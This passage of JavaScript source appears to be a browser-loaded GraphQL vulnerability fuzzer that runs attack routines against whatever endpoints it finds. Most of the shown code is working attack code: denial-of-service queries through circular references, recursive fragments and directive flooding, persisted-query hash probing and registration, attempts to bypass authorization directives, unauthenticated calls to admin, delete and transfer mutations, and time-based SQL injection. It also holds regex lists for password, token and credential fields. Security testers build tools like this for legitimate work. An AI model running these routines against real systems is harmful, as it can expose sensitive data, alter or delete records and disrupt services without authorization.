                      ${field.name} { __typename }
                    }
                  }
                }
              }
            }
          }`.replace(/\s+/g, ' ');

          const r = await this.query(endpoint, circularQuery);
          if (r.json?.data && !r.json?.errors?.some(e => /circular|depth|cycle/i.test(e.message || ''))) {
            this.addResult('CIRCULAR_REFERENCE', 'HIGH', endpoint, {
              type: type.name,
              field: field.name,
              evidence: 'Circular reference query accepted - DoS risk',
            });
          }
          break; // One finding is enough
        }
      }
    }

    async testWideQuery(endpoint) {
      const schema = this.schemas.get(endpoint);
      if (!schema) return;

      // Find type with many fields
      const wideType = schema.types?.find(t =>
        t.kind === 'OBJECT' &&
        !t.name?.startsWith('__') &&
        (t.fields?.length || 0) > 10
      );

      if (wideType) {
        // Request all fields at once
        const allFields = wideType.fields
          .filter(f => !f.args?.length) // Skip fields requiring args
          .map(f => f.name)
          .join(' ');

        if (allFields) {
          const r = await this.query(endpoint, `{ ${wideType.name.toLowerCase()} { ${allFields} } }`);
          if (r.json?.data && !r.json?.errors?.some(e => /complex|cost|limit/i.test(e.message || ''))) {
            this.addResult('WIDE_QUERY_ALLOWED', 'LOW', endpoint, {
              type: wideType.name,
              fieldCount: wideType.fields.length,
              evidence: 'All fields requested in single query accepted',
            });
          }
        }
      }
    }

    // ============================================================
    // PERSISTED QUERY ATTACKS
    // ============================================================

    async testPersistedQueryAttacks(endpoint) {
      console.log(`[GraphQL] Testing persisted query attacks on ${endpoint}`);

      // 1. APQ (Automatic Persisted Queries) detection
      await this.testAPQSupport(endpoint);

      // 2. Hash manipulation
      await this.testAPQHashManipulation(endpoint);

      // 3. Registration attempt
      await this.testAPQRegistration(endpoint);
    }

    async testAPQSupport(endpoint) {
      // Test APQ support with known hash
      const apqRequest = {
        extensions: {
          persistedQuery: {
            version: 1,
            sha256Hash: APQ_TEST_HASHES[0],
          },
        },
      };

      const r = await this.queryRaw(endpoint, apqRequest);
      if (r.json?.errors?.some(e => /PersistedQueryNotFound/i.test(e.message || ''))) {
        this.addResult('APQ_ENABLED', 'INFO', endpoint, {
          evidence: 'Automatic Persisted Queries enabled',
        });

        // APQ is enabled, test for bypass
        await this.testAPQBypass(endpoint);
      }
    }

    async testAPQHashManipulation(endpoint) {
      // Try to guess/manipulate hashes
      for (const hash of APQ_TEST_HASHES) {
        const r = await this.queryRaw(endpoint, {
          extensions: {
            persistedQuery: { version: 1, sha256Hash: hash },
          },
        });

        if (r.json?.data && !r.json?.errors) {
          this.addResult('APQ_HASH_FOUND', 'MEDIUM', endpoint, {
            hash,
            evidence: 'Valid persisted query hash discovered',
          });
        }
      }
    }

    async testAPQRegistration(endpoint) {
      // Try to register a new persisted query
      const maliciousQuery = '{ __schema { types { name } } }';
      const hash = await this.sha256(maliciousQuery);

      const r = await this.queryRaw(endpoint, {
        query: maliciousQuery,
        extensions: {
          persistedQuery: { version: 1, sha256Hash: hash },
        },
      });

      // If query executed and no errors, registration might be open
      if (r.json?.data?.__schema && !r.json?.errors) {
        // Verify by querying with just the hash
        const verify = await this.queryRaw(endpoint, {
          extensions: {
            persistedQuery: { version: 1, sha256Hash: hash },
          },
        });

        if (verify.json?.data?.__schema) {
          this.addResult('APQ_REGISTRATION_OPEN', 'HIGH', endpoint, {
            evidence: 'Arbitrary persisted query registration allowed',
            hash,
          });
        }
      }
    }

    async testAPQBypass(endpoint) {
      // Try to bypass APQ requirement by sending query directly
      const r = await this.query(endpoint, '{ __typename }');
      if (r.json?.data?.__typename && !r.json?.errors) {
        this.addResult('APQ_BYPASS', 'MEDIUM', endpoint, {
          evidence: 'APQ can be bypassed by sending query directly',
        });
      }
    }

    async queryRaw(endpoint, body) {
      try {
        const r = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
          credentials: 'include',
        });
        const text = await r.text();
        try {
          return { status: r.status, json: JSON.parse(text), raw: text };
        } catch {
          return { status: r.status, raw: text };
        }
      } catch (e) {
        return { error: e.message };
      }
    }

    async sha256(message) {
      const msgBuffer = new TextEncoder().encode(message);
      const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    }

    // ============================================================
    // FRAGMENT ATTACKS
    // ============================================================

    async testFragmentAttacks(endpoint) {
      console.log(`[GraphQL] Testing fragment attacks on ${endpoint}`);

      // 1. Fragment spreading attack
      await this.testFragmentSpreading(endpoint);

      // 2. Recursive fragment detection
      await this.testRecursiveFragments(endpoint);
    }

    async testFragmentSpreading(endpoint) {
      // Create many fragments and spread them
      const fragments = Array.from({ length: 50 }, (_, i) =>
        `fragment F${i} on Query { __typename }`
      ).join('\n');

      const spreads = Array.from({ length: 50 }, (_, i) => `...F${i}`).join(' ');

      const query = `${fragments}\nquery { ${spreads} }`;
      const r = await this.query(endpoint, query);

      if (r.json?.data && !r.json?.errors?.some(e => /fragment|limit|complex/i.test(e.message || ''))) {
        this.addResult('FRAGMENT_SPREADING', 'LOW', endpoint, {
          evidence: '50 fragment spreads accepted',
          fragmentCount: 50,
        });
      }
    }

    async testRecursiveFragments(endpoint) {
      // Try recursive fragment (should be rejected)
      const recursiveQuery = `
        fragment A on Query { ...B }
        fragment B on Query { ...A }
        query { ...A }
      `;

      const r = await this.query(endpoint, recursiveQuery);
      if (r.json?.data && !r.json?.errors) {
        this.addResult('RECURSIVE_FRAGMENTS', 'HIGH', endpoint, {
          evidence: 'Recursive fragments accepted - DoS vulnerability',
        });
      }
    }

    // ============================================================
    // DIRECTIVE ABUSE
    // ============================================================

    async testDirectiveAbuse(endpoint) {
      console.log(`[GraphQL] Testing directive abuse on ${endpoint}`);

      // 1. Skip/include abuse
      await this.testSkipIncludeAbuse(endpoint);

      // 2. Custom directive detection
      await this.testCustomDirectives(endpoint);

      // 3. Directive flooding
      await this.testDirectiveFlooding(endpoint);
    }

    async testSkipIncludeAbuse(endpoint) {
      // Duplicate directives on same field
      const query = `{
        __typename @skip(if: false) @skip(if: false) @skip(if: false)
        __schema @include(if: true) @include(if: true) { queryType { name } }
      }`;

      const r = await this.query(endpoint, query);
      if (r.json?.data && !r.json?.errors) {
        this.addResult('DIRECTIVE_DUPLICATION', 'LOW', endpoint, {
          evidence: 'Duplicate directives on fields accepted',
        });
      }
    }

    async testCustomDirectives(endpoint) {
      const schema = this.schemas.get(endpoint);
      if (!schema) return;

      // Find custom directives (not @skip, @include, @deprecated)
      const customDirectives = schema.directives?.filter(d =>
        !['skip', 'include', 'deprecated', 'specifiedBy'].includes(d.name)
      ) || [];

      for (const directive of customDirectives) {
        this.addResult('CUSTOM_DIRECTIVE', 'INFO', endpoint, {
          directive: directive.name,
          description: directive.description,
          locations: directive.locations,
          evidence: 'Custom directive detected - may have security implications',
        });

        // Try to abuse auth-related directives
        if (/auth|admin|role|permission|public/i.test(directive.name)) {
          const bypassQuery = `{ __schema @${directive.name} { types { name } } }`;
          const r = await this.query(endpoint, bypassQuery);
          if (r.json?.data?.__schema) {
            this.addResult('AUTH_DIRECTIVE_BYPASS', 'HIGH', endpoint, {
              directive: directive.name,
              evidence: 'Auth directive may be bypassable',
            });
          }
        }
      }
    }

    async testDirectiveFlooding(endpoint) {
      // Many directives on single field
      const directives = Array.from({ length: 100 }, () => '@skip(if: false)').join(' ');
      const query = `{ __typename ${directives} }`;

      const r = await this.query(endpoint, query);
      if (r.json?.data && !r.json?.errors?.some(e => /directive|limit/i.test(e.message || ''))) {
        this.addResult('DIRECTIVE_FLOODING', 'LOW', endpoint, {
          evidence: '100 directives on single field accepted',
        });
      }
    }

    // ============================================================
    // AUTHORIZATION BYPASS TESTING
    // ============================================================

    async testAuthorizationBypass(endpoint) {
      console.log(`[GraphQL] Testing authorization bypass on ${endpoint}`);

      const schema = this.schemas.get(endpoint);
      if (!schema) return;

      // 1. Field-level authorization bypass
      await this.testFieldAuthBypass(endpoint, schema);

      // 2. Type confusion
      await this.testTypeConfusion(endpoint, schema);

      // 3. Mutation authorization
      await this.testMutationAuthBypass(endpoint, schema);
    }

    async testFieldAuthBypass(endpoint, schema) {
      // Look for sensitive fields that might be protected
      const sensitivePatterns = [
        /password|secret|token|key|credential|ssn|credit/i,
        /admin|internal|private|hidden/i,
        /salary|balance|income|payment/i,
      ];

      for (const type of (schema.types || [])) {
        if (type.kind !== 'OBJECT' || type.name?.startsWith('__')) continue;

        const sensitiveFields = type.fields?.filter(f =>
          sensitivePatterns.some(p => p.test(f.name))
        ) || [];

        for (const field of sensitiveFields) {
          // Try to access sensitive field directly
          const query = `{ ${type.name.toLowerCase()} { ${field.name} } }`;
          const r = await this.query(endpoint, query);

          if (r.json?.data && !r.json?.errors?.some(e => /auth|permission|forbidden|denied/i.test(e.message || ''))) {
            this.addResult('SENSITIVE_FIELD_EXPOSED', 'HIGH', endpoint, {
              type: type.name,
              field: field.name,
              evidence: 'Sensitive field accessible without proper authorization check',
            });
          }
        }
      }
    }

    async testTypeConfusion(endpoint, schema) {
      // Try to access fields via interface/union that might bypass type checks
      const interfaces = schema.types?.filter(t => t.kind === 'INTERFACE') || [];
      const unions = schema.types?.filter(t => t.kind === 'UNION') || [];

      for (const iface of interfaces) {
        // Try inline fragment with type confusion
        const query = `{
          ${iface.name.toLowerCase()} {
            ... on ${iface.name} { __typename }
          }
        }`;
        await this.query(endpoint, query);
      }
    }

    async testMutationAuthBypass(endpoint, schema) {
      const mutations = this.getOperations(schema, 'Mutation');

      // Look for admin/sensitive mutations
      const adminMutations = mutations.filter(m =>
        /admin|delete|destroy|update.*role|set.*permission|transfer|withdraw/i.test(m.name)
      );

      for (const mutation of adminMutations.slice(0, 5)) {
        // Try mutation without auth
        const { query, variables } = this.buildQuery(mutation.name, mutation.args || [], false);
        const r = await this.query(endpoint, query, variables);

        // Check if mutation executed (even with error)
        if (r.json?.data?.[mutation.name] !== undefined) {
          this.addResult('MUTATION_AUTH_BYPASS', 'CRITICAL', endpoint, {
            mutation: mutation.name,
            evidence: 'Sensitive mutation accessible without proper authorization',
          });
        }
      }
    }

    // ============================================================
    // SUBSCRIPTION VULNERABILITY TESTING
    // ============================================================

    async testSubscriptionVulnerabilities(endpoint) {
      console.log(`[GraphQL] Testing subscription vulnerabilities on ${endpoint}`);

      const schema = this.schemas.get(endpoint);
      const subscriptions = schema ? this.getOperations(schema, 'Subscription') : [];

      if (subscriptions.length === 0) {
        // Try common subscription endpoints
        const wsEndpoint = endpoint.replace(/^http/, 'ws');
        await this.probeWebSocketEndpoint(wsEndpoint);
        return;
      }

      // Report found subscriptions
      for (const sub of subscriptions) {
        this.addResult('SUBSCRIPTION_FOUND', 'INFO', endpoint, {
          subscription: sub.name,
          args: sub.args?.map(a => `${a.name}: ${this.getTypeName(a.type)}`).join(', '),
          evidence: 'GraphQL subscription available',
        });

        // Check for sensitive subscriptions
        if (/admin|internal|debug|log|event|notification/i.test(sub.name)) {
          this.addResult('SENSITIVE_SUBSCRIPTION', 'MEDIUM', endpoint, {
            subscription: sub.name,
            evidence: 'Potentially sensitive subscription detected',
          });
        }
      }
    }

    async probeWebSocketEndpoint(wsEndpoint) {
      // Can't use WebSocket directly in content script reliably, but we can report
      this.addResult('WEBSOCKET_ENDPOINT', 'INFO', wsEndpoint, {
        evidence: 'WebSocket endpoint for subscriptions may be available',
        note: 'Manual testing recommended',
      });
    }

    // ============================================================
    // TIME-BASED INJECTION TESTING
    // ============================================================

    async testTimeBasedInjection(endpoint) {
      console.log(`[GraphQL] Testing time-based injection on ${endpoint}`);

      const schema = this.schemas.get(endpoint);
      if (!schema) return;

      const queries = this.getOperations(schema, 'Query');

      for (const q of queries) {
        const stringArgs = q.args?.filter(a =>
          ['String', 'ID'].includes(this.getTypeName(a.type))
        ) || [];

        if (stringArgs.length === 0) continue;

        // Test first string arg with time-based payloads
        const arg = stringArgs[0];
        const { query, variables } = this.buildQuery(q.name, q.args);

        for (const payload of PAYLOADS.timeBased.slice(0, 2)) {
          variables[arg.name] = payload;

          const start = performance.now();
          const r = await this.query(endpoint, query, variables);
          const duration = performance.now() - start;

          // If response took > 4 seconds, likely time-based SQLi
          if (duration > 4000) {
            this.addResult('TIME_BASED_INJECTION', 'CRITICAL', endpoint, {
              operation: q.name,
              arg: arg.name,
              payload,
              duration: Math.round(duration) + 'ms',
              evidence: 'Response delayed by injection payload',
            });
            return; // Critical finding, stop testing
          }
        }

        // Only test first query with string args
        break;
      }
    }

    addResult(type, severity, endpoint, data) {
      // Dedupe
      const key = `${type}:${endpoint}:${data.operation || data.query || data.mutation || ''}:${data.payload || ''}`;
      if (this.results.some(r => `${r.type}:${r.endpoint}:${r.data?.operation || r.data?.query || r.data?.mutation || ''}:${r.data?.payload || ''}` === key)) {
        return;
      }

      this.results.push({ type, severity, endpoint, data, timestamp: new Date().toISOString() });

      // Report to extension via postMessage (page context can't use chrome.runtime)
      if (!_schemaOk || !_gc) return;
      if (typeof window !== 'undefined') {
        const msg = {
          type: '__lonkero_finding__',
          finding: {
            type: `GRAPHQL_${type}`,
            severity: severity.toLowerCase(),
            url: endpoint,
            ...data,
          }
        };
        console.log('[GraphQL] Posting finding to extension:', msg.finding.type, msg);
        window.postMessage(msg, '*');
      }
    }

    // Extract server fingerprint from error response
    fingerprintFromError(endpoint, responseText, status) {
      const serverPatterns = [
        { pattern: /openresty/i, name: 'OpenResty' },
        { pattern: /nginx\/[\d.]+/i, name: 'nginx' },
        { pattern: /nginx/i, name: 'nginx' },
        { pattern: /apache\/[\d.]+/i, name: 'Apache' },
        { pattern: /apache/i, name: 'Apache' },
        { pattern: /Microsoft-IIS\/[\d.]+/i, name: 'IIS' },
        { pattern: /cloudflare/i, name: 'Cloudflare' },
        { pattern: /varnish/i, name: 'Varnish' },
        { pattern: /LiteSpeed/i, name: 'LiteSpeed' },
        { pattern: /Express/i, name: 'Express.js' },
        { pattern: /Tomcat/i, name: 'Tomcat' },
        { pattern: /Jetty/i, name: 'Jetty' },
        { pattern: /gunicorn/i, name: 'Gunicorn' },
        { pattern: /uvicorn/i, name: 'Uvicorn' },
        { pattern: /werkzeug/i, name: 'Werkzeug' },
        { pattern: /Kestrel/i, name: 'Kestrel' },
        { pattern: /ASP\.NET/i, name: 'ASP.NET' },
        { pattern: /PHP\/[\d.]+/i, name: 'PHP' },
      ];

      for (const { pattern, name } of serverPatterns) {
        const match = responseText.match(pattern);
        if (match) {
          // Extract version if present
          const versionMatch = responseText.match(new RegExp(name + '[/\\s]*([\\d.]+)', 'i'));
          const version = versionMatch ? versionMatch[1] : null;

          this.addResult('SERVER_FINGERPRINT', 'INFO', endpoint, {
            server: name,
            version: version,
            status: status,
            evidence: match[0],
            source: 'error_response',
          });
          console.log(`[GraphQL] Server fingerprint: ${name}${version ? ' ' + version : ''} (from ${status} response)`);
          break;
        }
      }
    }

    // Main entry point
    async fuzz(endpointOrAuto = null, options = {}) {
      if (!_schemaOk) throw new Error('Not available');
      const {
        quick = false,        // Quick scan (basic tests only)
        aggressive = false,   // Aggressive mode (all tests including DoS)
      } = options;

      console.log(`[GraphQL] Starting ${aggressive ? 'aggressive' : quick ? 'quick' : 'smart'} fuzzing...`);

      // Discover or use provided endpoint
      if (endpointOrAuto) {
        this.endpoints = [endpointOrAuto];
      } else {
        await this.discoverEndpoints();
      }

      if (this.endpoints.length === 0) {
        console.log('[GraphQL] No endpoints to test');
        return this.getReport();
      }

      for (const endpoint of this.endpoints) {
        if (this.testedEndpoints.has(endpoint)) continue;
        this.testedEndpoints.add(endpoint);

        console.log(`[GraphQL] Testing ${endpoint}`);

        // First probe the endpoint
        const probe = await this.query(endpoint, '{ __typename }');

        // Collect server fingerprint from error responses
        if (probe.raw && probe.status >= 400) {
          this.fingerprintFromError(endpoint, probe.raw, probe.status);
        }

        // Report endpoint status but continue testing
        if (probe.status === 405) {
          this.addResult('ENDPOINT_405', 'INFO', endpoint, {
            evidence: 'Method Not Allowed - may need different Content-Type or method',
            status: probe.status,
          });
        } else if (probe.status === 403 || probe.status === 401) {
          this.addResult('AUTH_REQUIRED', 'INFO', endpoint, {
            evidence: `Authentication required (${probe.status})`,
            status: probe.status,
          });
        }

        // Get schema
        const schema = await this.analyzeSchema(endpoint);

        // Test security controls (always run)
        await this.testSecurityControls(endpoint);

        // FIRST: Extract and fuzz with real queries from source code
        // This is the smartest approach - use the actual queries the app uses
        await this.fuzzWithExtractedQueries(endpoint);

        // THEN: Schema-based fuzzing for additional coverage
        if (schema) {
          await this.fuzzWithSchema(endpoint, schema);
        } else {
          await this.fuzzWithoutSchema(endpoint);
        }

        if (!quick) {
          // Advanced tests (from Lonkero Rust scanner)
          console.log(`[GraphQL] Running advanced tests on ${endpoint}`);

          // Batch query attacks
          await this.testBatchAttacks(endpoint);

          // Persisted query attacks (APQ)
          await this.testPersistedQueryAttacks(endpoint);

          // Fragment attacks
          await this.testFragmentAttacks(endpoint);

          // Directive abuse
          await this.testDirectiveAbuse(endpoint);

          // Authorization bypass
          await this.testAuthorizationBypass(endpoint);

          // Subscription vulnerabilities
          await this.testSubscriptionVulnerabilities(endpoint);

          // Time-based injection (last - slow)
          await this.testTimeBasedInjection(endpoint);

          if (aggressive) {
            // DoS-focused tests (potentially disruptive)
            console.log(`[GraphQL] Running complexity/DoS tests on ${endpoint}`);
            await this.testComplexityAttacks(endpoint);
          }
        }
      }

      const report = this.getReport();
      console.log('[GraphQL] Complete:', report.summary);
      return report;
    }

    // Quick scan - basic tests only
    async quickFuzz(endpoint = null) {
      return this.fuzz(endpoint, { quick: true });
    }

    // Full scan including DoS tests
    async aggressiveFuzz(endpoint = null) {
      return this.fuzz(endpoint, { aggressive: true });
    }

    getReport() {
      const bySeverity = {
        CRITICAL: this.results.filter(r => r.severity === 'CRITICAL'),
        HIGH: this.results.filter(r => r.severity === 'HIGH'),
        MEDIUM: this.results.filter(r => r.severity === 'MEDIUM'),
        LOW: this.results.filter(r => r.severity === 'LOW'),
        INFO: this.results.filter(r => r.severity === 'INFO'),
      };

      return {
        endpoints: this.endpoints,
        schemas: this.schemas.size,
        summary: {
          total: this.results.length,
          critical: bySeverity.CRITICAL.length,
          high: bySeverity.HIGH.length,
          medium: bySeverity.MEDIUM.length,
          low: bySeverity.LOW.length,
          info: bySeverity.INFO.length,
        },
        findings: this.results,
      };
    }
  }

  // Expose
  window.gqlFuzz = new SmartGraphQLFuzzer();

  console.log('[Lonkero] Smart GraphQL Fuzzer v3.1 loaded (ported from Rust scanner)');
  console.log('');
  console.log('  gqlFuzz.fuzz()                    - Auto-discover and full scan');
  console.log('  gqlFuzz.fuzz("/graphql")          - Scan specific endpoint');
  console.log('  gqlFuzz.quickFuzz()               - Quick scan (basic tests)');
  console.log('  gqlFuzz.aggressiveFuzz()          - Full scan + DoS/complexity tests');
  console.log('  gqlFuzz.extractQueriesFromSource() - Extract queries from page JS');
  console.log('  gqlFuzz.getReport()               - Get detailed results');
  console.log('');
  console.log('Source Code Analysis:');
  console.log('  - Extracts gql`...` tagged templates');
  console.log('  - Parses { query: "..." } objects');
  console.log('  - Finds persisted query hashes');
  console.log('  - Uses REAL app queries for smarter fuzzing');
  console.log('');
  console.log('Advanced tests included:');
  console.log('  - Extracted query injection (SQLi, NoSQLi, XSS, IDOR)');
  console.log('  - Batch query attacks (mutation batching, alias coalescing)');
  console.log('  - Query complexity DoS (deep nesting, circular refs)');
  console.log('  - Persisted query attacks (APQ probing, registration)');
  console.log('  - Fragment attacks (spreading, recursive)');
  console.log('  - Directive abuse (custom directives, flooding)');
  console.log('  - Authorization bypass (field-level, mutation authz)');
  console.log('  - Subscription vulnerabilities');
  console.log('  - Time-based injection');

})();
